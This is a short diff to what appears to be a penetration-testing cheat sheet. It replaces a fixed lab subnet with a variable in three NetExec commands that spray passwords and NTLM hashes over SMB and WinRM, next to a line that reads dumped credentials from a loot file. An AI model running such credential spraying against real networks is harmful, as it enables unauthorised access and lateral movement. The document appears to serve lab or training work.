@@ -30,9 +30,9 @@ cat /tmp/loot.txt                    # any dumped creds
 Spray what you have against all discovered hosts before moving manually:
 
 ```bash
-nxc smb 10.10.10.0/24 -u <user> -p '<pass>'          # password
-nxc smb 10.10.10.0/24 -u <user> -H <ntlm-hash>       # hash
-nxc winrm 10.10.10.0/24 -u <user> -p '<pass>'        # WinRM
+nxc smb $SUBNET -u <user> -p '<pass>'          # password
+nxc smb $SUBNET -u <user> -H <ntlm-hash>       # hash
+nxc winrm $SUBNET -u <user> -p '<pass>'        # WinRM
 ```
 
 Hosts returning `(Pwn3d!)` have local admin access.
